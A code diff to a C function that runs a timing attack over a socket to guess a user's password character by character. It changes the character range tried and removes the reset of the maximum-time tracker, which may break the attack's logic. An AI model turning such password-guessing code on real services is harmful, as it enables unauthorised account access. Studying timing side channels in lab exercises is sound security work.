@@ -18,8 +18,8 @@ void discoverPassword(int clientSocket, char* username) {
     char server_buffer[1024];
 
     char maxTimeChar;
-    int maxTime = 0;
-    char currChar = 33;
+    char currChar = 65;
+    time_t maxTime = 0;
     time_t timeBefore, timeAfter;
 
     //Perform the timing attack to discover the password
@@ -52,13 +52,11 @@ void discoverPassword(int clientSocket, char* username) {
 
         // Move to the next char
         currChar++;
-        if(currChar > 126) {
-            currChar = 33;
-            password_buffer[strlen(password_buffer)] = maxTimeChar;
-            strcpy(rightPassword, password_buffer);
+        if(currChar > 122) {
+            currChar = 65;
+            rightPassword[strlen(rightPassword)] = maxTimeChar;
         }
 
-        maxTime = 0;
         bzero(server_buffer, sizeof(server_buffer)); 
     }
 
